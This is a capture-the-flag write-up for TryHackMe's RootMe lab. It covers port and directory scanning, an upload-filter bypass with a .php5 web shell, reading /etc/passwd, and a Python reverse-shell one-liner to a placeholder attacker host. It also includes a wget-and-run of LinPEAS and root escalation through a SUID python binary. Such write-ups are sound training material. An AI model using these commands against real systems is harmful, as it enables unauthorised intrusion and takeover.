## RootMe CTF - [Room](https://tryhackme.com/room/rrootme)

First lets grab the ip:
  - 10.10.220.202

### $ Recon
After we get the ip, lets run a portscan, i will use nmap:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Ok, we now that are running 2 ports, SSH and Http apache 2.2.29 Server

Ok. Now lets use gobuster

`gobuster -w /path/to/wordlist -u 10.10.220.202 `

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.220.202/
[+] Threads      : 10
[+] Wordlist     : /path/to/wordlist/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/02/01 17:48:10 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/js (Status: 301)
/xxxxxx (Status: 301)
/server-status (Status: 403)
/xxxxxxx (Status: 301)
=====================================================
2023/02/01 17:50:41 Finished
=====================================================
```

We will find this two important directories (I censured for you folks do it by yourselfs)

so, lets enter on the first directory that we found.
As we can see its a upload panel. Lets try upload our PHP script


### $ SHELL TIME


**FOR THE PEOPLE WHO NEEDS:**

![Screenshot1](.)

So lets upload our shell.
And as we can see, the upload panel blocks php files. so what we do?

(SIMPLE WAY) We simply change the file extension to .php5 (or other php ext.) and upload:

![Screenshot2](.)

Next we go to http://10.10.220.202/xxxxxx/filename.php5

After that we can type any command that we what, lets try `cat /etc/passwd` as test
And the output gives:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
rootme:x:1000:1000:RootMe:/home/rootme:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
test:x:1001:1001:,,,:/home/test:/bin/bash
```

So, Nice. Lets execute a reverse shell in that i will use: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("thmip",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

I setup a lister with nc: `nc -lvnp 9001`

and started both.
Now we have a shell as you can see

Searching on files we will found user.txt

### # PRIVESC

Now, lets search for privilege escalation. I will use the script LinPEAS to search for.

I use python3 -m http.server 8000 in my host machine
and in the reverse shell that we get i did (YOU NEED TO DOWNLOAD LINPEAS SCRIPT)

`cd /tmp && wget http://yourthmip:8000/linPEAS.sh && chmod +x linPEAS.sh && ./linPEAS.sh`

After linPEAS stop, we see what we can get anddd....

```
-rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python
```
Python have SUID perms, so lets use that as privesc:

`/usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`

Running that, we get a EUID and a EGID bash (EUID and EGID is Effective user id, and effective group id)

so now, as "root" we just do:
`cat /root/root.txt`

and we get the root flag.

Easy ctf, i hope i helped you guys.
